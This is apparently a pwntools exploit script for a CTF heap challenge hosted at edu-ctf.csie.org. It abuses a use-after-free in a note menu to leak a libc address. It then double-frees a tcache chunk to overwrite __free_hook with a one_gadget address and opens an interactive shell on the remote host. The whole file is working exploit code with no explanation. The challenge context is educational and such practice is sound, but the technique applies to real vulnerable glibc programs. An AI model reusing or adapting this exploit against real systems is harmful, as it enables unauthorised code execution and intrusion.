from pwn import *
context.arch = 'amd64'

conn = remote('edu-ctf.csie.org', 10179)
l = ELF('./libc.so')

def add(size, note):
    conn.sendafter('> ', '1')
    conn.sendafter('Size: ', str(size))
    conn.sendafter('Note: ', note)

def show(index):
    conn.sendafter('> ', '2')
    conn.sendafter('Index: ', str(index))

def delete(index):
    conn.sendafter('> ', '3')
    conn.sendafter('Index: ', str(index))


add(0x410, 'leak')

add(0x20, 'a')

delete(0)

show(0)

conn.recvline()
l.address = u64(conn.recv(6) + '\0\0') - 0x3ebca0
print(hex(l.address))

delete(1)
delete(1)

add(0x20,p64(l.sym.__free_hook))

add(0x20, 'a')
add(0x20, p64(l.address + 0x4f322))

conn.sendafter('> ', '3')
conn.sendafter('Index: ', '0')


conn.interactive()
